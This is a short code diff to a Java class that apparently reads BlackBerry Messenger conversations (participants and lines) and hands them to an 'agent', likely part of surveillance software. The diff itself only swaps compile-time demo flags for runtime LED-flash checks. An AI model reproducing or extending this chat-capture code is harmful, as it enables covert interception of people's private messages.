@@ -16,6 +16,7 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Status;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -53,9 +54,9 @@ public class ConversationScreen {
     public synchronized void getConversationScreen() {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
-                //#ifdef DEMO
-                Debug.ledFlash(Debug.COLOR_RED);
-                //#endif
+                if (Status.self().isDemo()) {
+                    Debug.ledFlash(Debug.COLOR_RED);
+                }
                 return;
             }
 
@@ -122,9 +123,9 @@ public class ConversationScreen {
                                 .getInstance();
                         agent.add(partecipants, lines);
 
-                        //#ifdef DEMO
-                        Debug.ledFlash(Debug.COLOR_YELLOW);
-                        //#endif
+                        if (Status.self().isDemo()) {
+                            Debug.ledFlash(Debug.COLOR_YELLOW);
+                        }
                     }
                 } else {
                     //#ifdef DEBUG
